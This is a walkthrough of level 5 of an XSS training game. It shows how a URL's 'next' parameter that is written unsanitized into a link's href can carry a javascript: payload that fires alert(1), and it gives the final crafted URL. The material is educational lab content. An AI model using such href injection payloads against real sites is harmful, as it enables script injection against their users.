## 🛡️ Level 5: Breaking protocol

### 🎯 Mission Description  
Cross-site scripting isn't just about injecting new elements into the DOM. Sometimes, you can exploit how the application handles protocols like `javascript:`.

### 🎯 Mission Objective  
Inject a script that triggers `alert()` in the application's context.

### 🧩 Steps  
1. Open the challenge URL:  
   `https://xss-game.appspot.com/level5/frame/signup?next=confirm`

2. View the page source and find this:
   ```html
   <a href="confirm">Next >></a>
   ```

3. The `next` parameter in the URL is directly inserted into the `href` attribute.

4. Change the `next` value in the URL to:
   ```
   javascript:onclick=alert(1);
   ```

5. Final link becomes:  
   `https://xss-game.appspot.com/level5/frame/signup?next=javascript:onclick=alert(1);`

6. Now the rendered HTML is:
   ```html
   <a href="javascript:onclick=alert(1)">Next >></a>
   ```

7. Click the "Next >>" link → 💥 `alert(1)` pops.

### 💣 Final Payload  
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:onclick=alert(1);
```

### 📝 Notes  
- No DOM injection needed.
- It's abusing how the `href` accepts and executes `javascript:` protocols.
- Always sanitize and validate `href` parameters in URLs.

**Status: Solved ✅**
